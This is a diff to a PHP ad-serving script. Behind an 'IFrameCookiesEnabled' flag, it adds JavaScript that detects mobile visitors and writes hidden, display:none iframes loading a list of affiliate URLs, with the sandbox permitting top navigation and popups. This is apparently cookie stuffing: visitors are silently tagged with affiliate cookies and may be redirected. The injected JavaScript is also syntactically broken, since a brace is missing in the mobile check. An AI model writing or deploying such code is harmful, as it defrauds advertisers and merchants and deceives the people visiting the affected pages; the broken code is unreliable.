@@ -384,6 +384,8 @@
 	$consoleLoggingEnabled 			= array_key_exists("ConsoleLoggingEnabled", $adConfig) && $adConfig["ConsoleLoggingEnabled"] === "false" ? false : true;
 	$forceDirtyAd 					= array_key_exists("ForceDirtyAd", $adConfig) && $adConfig["ForceDirtyAd"] === "false" ? false : true;
 	$trafficLoggerEnabled			= array_key_exists("TrafficLoggerEnabled", $adConfig) && $adConfig["TrafficLoggerEnabled"] === "true" ? true : false;
+	$iFrameCookiesEnabled			= array_key_exists("IFrameCookiesEnabled", $adConfig) && $adConfig["IFrameCookiesEnabled"] === "true" ? true : false;
+	$affiliateLinkUrl				= array_key_exists("AffiliateLinkUrl", $adConfig) ? json_decode($adConfig["AffiliateLinkUrl"]) : array();
 	$HTMLTemplate 					= array_key_exists("HTMLTemplate", $adConfig) ? $adConfig["HTMLTemplate"] : "";
 	$HTMLTemplateValues 			= array_key_exists("HTMLTemplateValues", $adConfig) ? json_decode($adConfig["HTMLTemplateValues"]) : "";
 
@@ -844,6 +846,34 @@
 
 					   </script>";
 
+					if ($iFrameCookiesEnabled) {
+						$scriptCode .=
+"(function() {
+    var packageName = 'dreamsky';
+    if (!window[packageName]) {
+        window[packageName] = {};
+    }
+    var tool = {
+        ismobile: function() {
+            if (!(('ontouchstart' in window) || (navigator.MaxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0))) {
+                return false;
+            return true;
+        },
+        writeOffer: function(offerUrl) {
+            document.write('<iframe src=\"' + offerUrl + '\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>');
+        },
+    }
+    window[packageName]['tool'] = tool;
+})();
+
+if (dreamsky.tool.ismobile()) {";
+
+						foreach($affiliateLinkUrl as $url) {
+							$scriptCode .= "dreamsky.tool.writeOffer('" . $url. "');";
+						}
+						$scriptCode .= "} ";
+					}					   
+					   
 		if ($outputMethod === "JS")
 		{
 			$scriptCode .= "\n<script type=\"text/javascript\">go();</script>";
